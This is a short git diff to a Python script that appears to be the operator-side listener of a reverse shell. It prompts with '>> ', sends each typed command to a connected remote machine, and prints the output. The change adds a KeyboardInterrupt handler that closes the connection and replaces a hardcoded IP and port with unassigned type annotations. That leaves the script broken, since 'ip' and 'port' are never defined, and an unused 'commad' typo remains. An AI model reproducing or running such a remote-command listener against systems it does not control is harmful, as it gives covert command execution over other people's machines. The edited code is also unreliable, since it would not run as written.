@@ -19,17 +19,20 @@ class Listener:
         return result
 
     def run(self):
-        while True:
-            command = str(input(">> "))
-            commad = command.encode("utf-8")
-            result = self.execute_remotely(command)
-            print(result)
+        try:
+            while True:
+                command = str(input(">> "))
+                commad = command.encode("utf-8")
+                result = self.execute_remotely(command)
+                print(result)
+        except KeyboardInterrupt:
+            self.connection.close()
 
 
 if __name__ == "__main__":
 
-    ip = "192.168.20.158"
-    port = 8080
+    ip: str
+    port: int
 
     listener = Listener(ip, port)
     listener.run()
